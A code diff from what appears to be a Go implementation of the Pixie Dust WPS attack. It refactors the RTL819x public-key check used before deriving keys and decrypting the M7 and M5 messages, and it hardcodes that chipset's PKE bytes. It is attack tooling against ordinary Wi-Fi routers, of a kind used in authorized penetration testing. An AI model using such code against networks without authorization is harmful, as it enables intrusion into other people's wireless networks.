@@ -33,7 +33,6 @@ import (
 func (pda *pixieDustAttack) executeRTL819xCase() {
 	if len(pda.m7enc) == 0 { return }
 	pda.rtl819xReqFlags()
-	pda.isRTL819xPKE()
 	pda.keyDerivationFunction()
 	pda.decryptM7()
 	pda.decryptM5()
@@ -60,11 +59,15 @@ func (pda *pixieDustAttack) rtl819xReqFlags() {
 	if len(pda.rNonce) == 0 || len(pda.ebssid) == 0 {
 		utils.Abort("Registrar Nonce (R-Nonce) and/or EBSSID not found")
 	}
+
+	if !pda.isRTL819xPKE() {
+        utils.Abort("Model not supported! (PKE does not match RTL819x)")
+    }
 }
 
 
 
-func (pda *pixieDustAttack) isRTL819xPKE() {
+func (pda *pixieDustAttack) isRTL819xPKE() bool {
 	wpsRtlPke := []byte{
 		0xD0,0x14,0x1B,0x15, 0x65,0x6E,0x96,0xB8, 0x5F,0xCE,0xAD,0x2E, 0x8E,0x76,0x33,0x0D,
 		0x2B,0x1A,0xC1,0x57, 0x6B,0xB0,0x26,0xE7, 0xA3,0x28,0xC0,0xE1, 0xBA,0xF8,0xCF,0x91,
@@ -80,9 +83,7 @@ func (pda *pixieDustAttack) isRTL819xPKE() {
 		0x66,0xA5,0xA4,0x90, 0x47,0x2C,0xEB,0xA9, 0xE3,0xB4,0x22,0x4F, 0x3D,0x89,0xFB,0x2B,
 	}
 
-    if !bytes.Equal(pda.pke, wpsRtlPke) {
-        utils.Abort("Model not supported! (PKE does not match RTL819x)")
-    }
+    return bytes.Equal(pda.pke, wpsRtlPke)
 }
 
 
